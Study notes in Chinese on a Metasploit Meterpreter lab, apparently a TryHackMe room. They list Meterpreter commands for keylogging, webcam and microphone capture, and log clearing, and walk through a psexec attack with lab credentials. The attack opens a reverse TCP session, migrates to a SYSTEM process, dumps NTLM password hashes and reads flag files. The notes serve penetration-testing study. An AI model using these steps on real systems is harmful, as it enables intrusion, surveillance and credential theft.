# Metasploit：Meterpreter

## task1
Meterpreter 將被視為一個進程，並且在目標系統上沒有文件。     

                  
Meterpreter 還旨在通過與運行 Metasploit 的服務器（通常是您的攻擊機）進行加密通信，避免被基於網絡的 IPS（入侵防禦系統）和 IDS（入侵檢測系統）解決方案檢測到。如果目標組織不解密和檢查進出本地網絡的加密流量（例如 HTTPS），IPS 和 IDS 解決方案將無法檢測到其活動。       
        

`getpid` 命令，它返回運行 Meterpreter 的進程 ID     

`ps` 列出在目標系統上運行的進程    
## task2
了解可用的 Meterpreter 版本的最簡單方法是使用 msfvenom 列出它們       

```
使用了 msfvenom --list payloads 命令並 grepped 了“meterpreter”有效載荷（添加| grep meterpreter到命令行）  
```

決定使用哪個版本的 Meterpreter 主要取決於三個因素：
```
目標操作系統（目標操作系統是 Linux 還是 Windows？是 Mac 設備？是 Android 手機？等）
目標系統上可用的組件（是否安裝了 Python？這是一個 PHP 網站嗎？等）
您可以與目標系統建立的網絡連接類型（它們允許原始 TCP 連接嗎？您只能有一個 HTTPS 反向連接嗎？IPv6 地址不像 IPv4 地址那樣受到密切監控嗎？等等） 
```

不使用 Meterpreter 作為由 Msfvenom 生成的獨立有效負載，您的選擇也可能會受到漏洞利用的限制。您會注意到一些漏洞利用將具有默認的 Meterpreter 有效負載     

例如:
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
可以使用`show payloads`列出其他可用的有效負載。    

## task3
### Meterpreter 命令
meterpreter可以用`help`列出所有可用命令   
它們可能並不都有效。例如，目標系統可能沒有網絡攝像頭，或者它可以在沒有適當桌面環境的虛擬機上運行。
```
Meterpreter 將為您提供三個主要類別的工具；

內置命令
Meterpreter 工具
Meterpreter 腳本
如果您運行該 help 命令，您將看到 Meterpreter 命令列在不同的類別下。

核心命令
文件系統命令
聯網命令
系統命令
用戶界面命令
網絡攝像頭命令
音頻輸出命令
提升命令
密碼數據庫命令
時間戳命令
請注意，上面的列表取自help Windows 版本的 Meterpreter (windows/x64/meterpreter/reverse_tcp) 上的命令輸出。對於其他 Meterpreter 版本，這些將有所不同。


Meterpreter 命令

核心命令將有助於導航和與目標系統交互。下面是一些最常用的。一旦 Meterpreter 會話開始，請記住檢查運行幫助命令的所有可用命令。

核心命令
background：背景當前會話
exit: 終止 Meterpreter 會話
guid：獲取會話 GUID（全局唯一標識符）
help：顯示幫助菜單
info：顯示有關 Post 模塊的信息
irb: 在當前會話中打開一個交互式 Ruby shell
load: 加載一個或多個 Meterpreter 擴展
migrate：允許您將 Meterpreter 遷移到另一個進程
run: 執行 Meterpreter 腳本或 Post 模塊
sessions：快速切換到另一個會話
文件系統命令

cd: 將改變目錄
ls：將列出當前目錄中的文件（dir 也可以）
pwd：打印當前工作目錄
edit: 將允許您編輯文件
cat：將文件的內容顯示到屏幕上
rm: 將刪除指定文件
search: 將搜索文件
upload: 將上傳文件或目錄
download: 將下載文件或目錄
聯網命令

arp：顯示主機 ARP（地址解析協議）緩存
ifconfig：顯示目標系統上可用的網絡接口
netstat：顯示網絡連接
portfwd: 將本地端口轉發到遠程服務
route：允許您查看和修改路由表
系統命令

clearev：清除事件日誌
execute: 執行命令
getpid：顯示當前進程標識符
getuid：向用戶顯示 Meterpreter 正在運行
kill: 終止進程
pkill: 按名稱終止進程
ps: 列出正在運行的進程
reboot：重新啟動遠程計算機
shell: 進入系統命令外殼
shutdown：關閉遠程計算機
sysinfo：獲取有關遠程系統的信息，例如操作系統
其他命令（這些將在幫助菜單的不同菜單類別下列出）

idletime: 返回遠程用戶空閒的秒數
keyscan_dump：轉儲擊鍵緩衝區
keyscan_start: 開始捕捉擊鍵
keyscan_stop：停止捕獲擊鍵
screenshare：允許您實時觀看遠程用戶的桌面
screenshot：抓取交互式桌面的屏幕截圖
record_mic：從默認麥克風錄製音頻 X 秒
webcam_chat：開始視頻聊天
webcam_list：列出網絡攝像頭
webcam_snap：從指定的網絡攝像頭拍攝快照
webcam_stream：播放來自指定網絡攝像頭的視頻流
getsystem: 嘗試將您的權限提升到本地系統的權限
hashdump: 轉儲 SAM 數據庫的內容
```
## task4
### 後期開發
`getuid`顯示當前正在運行 Meterpreter 的用戶     
了解您在目標系統上可能的特權級別（例如，您是 NT AUTHORITY\SYSTEM 之類的管理員級別用戶還是普通用戶？）
-------------------------------------------
`ps`命令將列出正在運行的進程。PID 列還將為您提供將 Meterpreter 遷移到另一個進程所需的 PID 信息。    
-------------------------------------------
`migrate`  遷移      
遷移到另一個進程將有助於 Meterpreter 與之交互  
```
例如，如果您看到目標上運行的文字處理器（例如 word.exe、notepad.exe 等），您可以遷移到它並開始捕獲用戶發送到此進程的擊鍵。某些 Meterpreter 版本將為您提供keyscan_start、 keyscan_stop和keyscan_dumpcommand 選項，以使 Meterpreter 像鍵盤記錄器一樣工作。遷移到另一個進程也可以幫助您擁有更穩定的 Meterpreter 會話
```
鍵入 migrate 命令，後跟所需目標進程的 PID。下面的示例顯示 Meterpreter 遷移到進程 ID 716。
```
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
meterpreter >
```

`當心; 如果您從較高權限（例如 SYSTEM）用戶遷移到由較低權限用戶（例如 Web 服務器）啟動的進程，您可能會失去您的用戶權限。您可能無法將它們取回。`     
----------------------------------
`hashdump` 命令將列出 SAM 數據庫的內容。SAM（安全帳戶管理器）數據庫在 Windows 系統上存儲用戶的密碼。這些密碼以 NTLM（新技術 LAN 管理器）格式存儲。
----------------------------------------------
`search` 命令對於定位文件很有用。在 CTF 中，這可用於快速找到標誌或證明文件，而在實際的滲透測試活動中，您可能需要搜索用戶生成的文件或可能包含密碼或帳戶信息的配置文件。    

```     
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```              

## task5   
前面提到的命令，例如getsystem和hashdump將為特權升級和橫向移動提供重要的槓桿和信息。Meterpreter 也是一個很好的基礎，您可以使用它來運行 Metasploit 框架上可用的後期利用模塊。最後，您還可以使用 load 命令來利用其他工具，例如 Kiwi 甚至整個 Python 語言。    

使用`load`加載任何其他工具後 ，您將在菜單上看到新選項help 。      
```
可以使用下面的憑據來模擬 SMB（服務器消息塊）的初始攻擊（使用exploit/windows/smb/psexec）

Username: ballen

Password: Password1
```

```
msf6 exploit(windows/smb/psexec) > set lhost 10.9.1.236 
lhost => 10.9.1.236
msf6 exploit(windows/smb/psexec) > set rhosts 10.10.142.53
rhosts => 10.10.142.53
msf6 exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.9.1.236:4444 
[*] 10.10.142.53:445 - Connecting to the server...
[*] 10.10.142.53:445 - Authenticating to 10.10.142.53:445 as user 'ballen'...
[*] 10.10.142.53:445 - Selecting PowerShell target
[*] 10.10.142.53:445 - Executing the payload...
[+] 10.10.142.53:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.142.53
[*] Meterpreter session 1 opened (10.9.1.236:4444 -> 10.10.142.53:53722 ) at 2022-01-22 09:02:21 -0500

meterpreter > 
```
### 計算機名稱是什麼？   
```
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows

```


### jchambers 用戶的 NTLM 哈希是什麼？
```
1. 失敗 
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.

2. 用ps顯示出其他process 然後migrate到其他的NT AUTHORITY\SYSTEM
試試看 

meterpreter > migrate 2516
[*] Migrating from 1648 to 2516...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:96fae44459c4e76244200221db3fd4b1:::
```
### jchambers 用戶的明文密碼是什麼？    
https://crackstation.net/ 到這破解

### “secrets.txt”文件在哪裡？
```
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 03:44:27 -0400

```
###  “realsecret.txt”文件在哪裡？
```
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 04:30:24 -0400

```
### 真正的秘密是什麼？
```
meterpreter > cat c:\inetpub\wwwroot\realsecret.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > shell
Process 2472 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\inetpub\wwwroot               
cd c:\inetpub\wwwroot

c:\inetpub\wwwroot>type realsecret.txt

type realsecret.txt
The Flash is the fastest man alive
c:\inetpub\wwwroot>

```